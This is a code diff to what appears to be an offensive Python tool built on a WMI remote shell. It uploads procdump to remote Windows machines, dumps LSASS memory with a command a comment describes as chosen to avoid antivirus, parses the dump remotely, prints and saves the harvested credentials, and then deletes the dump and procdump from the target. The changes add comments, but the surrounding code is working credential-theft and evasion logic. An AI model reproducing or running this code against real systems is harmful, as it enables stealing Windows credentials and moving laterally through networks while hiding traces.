@@ -87,7 +87,8 @@ class WMIEXEC:
             win32Process,_ = iWbemServices.GetObject('Win32_Process')
 
             self.shell = RemoteShell(self.__share, win32Process, self.__smbConnection)
-
+            
+            # Upload procdump
             procpath = os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'procdump', 'procdump%s.exe' % (osArch))
             logging.info("%s  Uploading procdump to %s..." % (debugBlue, addr))
             if logging.getLogger().getEffectiveLevel() > 10:
@@ -95,10 +96,10 @@ class WMIEXEC:
                     self.shell.do_put(procpath)
             else:
                 self.shell.do_put(procpath)
-                
             
             dt = datetime.now().strftime("%m-%d-%Y_%H-%M-%S")
 
+            # Execute procdump silently with pid to avoid AVs as much as possible
             cmd = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do procdump{}.exe -accepteula -ma ^%B C:\\{}.dmp""".format(osArch, addr + "_" + dt)
             logging.info("%s  Executing procdump on %s..." % (debugBlue, addr))
             if logging.getLogger().getEffectiveLevel() > 10:
@@ -107,19 +108,19 @@ class WMIEXEC:
             else:
                 self.shell.onecmd(cmd)
 
+            # Create dump's file descriptor to parse dumps remotely
             logging.info("%s  Creating dump's file descriptor on %s..." % (debugBlue, addr))
             logging.info("%s  Parsing %s's dump remotely..." % (debugBlue, addr))
             dump = Dump(self.__smbConnection, """{}.dmp""".format(addr + "_" + dt))
             credentials = parseDump(dump)
-
             if credentials is not None:
                 print_credentials(addr, credentials)
                 write_credentials(addr, credentials)
-            
+
         finally:
+            # Clean remote machines (dump & procdump)
             logging.info("%s  Closing dump file on %s..." % (debugBlue, addr))
             dump.close()
-
             logging.info("%s  Deleting procdump on %s..." % (debugBlue, addr))
             if logging.getLogger().getEffectiveLevel() > 10:
                 with suppress_std():
